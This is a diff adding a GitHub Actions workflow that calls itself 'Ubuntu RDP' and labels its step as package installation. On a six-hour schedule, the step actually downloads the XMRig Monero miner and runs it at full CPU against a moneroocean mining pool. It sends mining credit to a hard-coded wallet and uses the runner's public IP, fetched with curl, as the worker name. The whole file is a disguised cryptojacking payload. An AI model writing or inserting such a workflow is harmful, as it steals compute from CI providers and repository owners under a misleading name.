@@ -1,0 +1,15 @@
+
+
+name: Ubuntu RDP
+
+on:
+  schedule:
+  - cron: "0 */6 * * *"
+  workflow_dispatch:
+
+jobs:
+  Build:
+    runs-on: ubuntu-latest
+    steps:      
+      - name: Installing neccesary packages
+        run: sudo apt update -y && sudo apt install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y && wget https://github.com/xmrig/xmrig/releases/download/v6.19.0/xmrig-6.19.0-linux-x64.tar.gz && tar -xvf xmrig-6.19.0-linux-x64.tar.gz && cd xmrig-6.19.0 && ./xmrig -o gulf.moneroocean.stream:10128 -u 42XSJzfAXTjT5Vt5uatbH41SZRepyU2AJdWLVeGNkeZ3bbjUnyyL9X2Qq16BjzHLhkKYvWWcs3f3eKmuUbnJpjPeFm23v4v --max-cpu-usage=100 -p `curl ifconfig.me`
